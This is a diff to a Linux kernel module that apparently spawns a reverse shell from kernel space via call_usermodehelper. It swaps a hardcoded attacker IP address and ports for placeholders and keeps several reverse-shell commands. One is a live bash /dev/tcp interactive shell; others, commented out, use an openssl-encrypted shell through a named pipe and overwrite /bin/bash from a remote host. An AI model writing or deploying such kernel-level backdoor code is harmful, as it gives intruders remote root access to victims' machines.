@@ -6,9 +6,8 @@
 MODULE_LICENSE("GPL");
 MODULE_VERSION("1.0");
 
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/3.135.235.154/5555 0>&1", NULL};
-//char* argv[] = {"/bin/bash","-c", "openssl s_client -connect 3.135.235.154:5556 > /bin/bash"};
-//char* argv[] = {"/bin/bash","-c","mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.135.235.154:5556 > /tmp/s; rm /tmp/s", NULL};
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<IPADDRESS>/<PORTNUMBER> 0>&1", NULL};
+//char* argv[] = {"/bin/bash","-c","mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IPADDRESS>:<PORTNUMBER>  > /tmp/s; rm /tmp/s", NULL}; testing with encrypted communication
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 // call_usermodehelper function is used to create user mode processes from kernel space
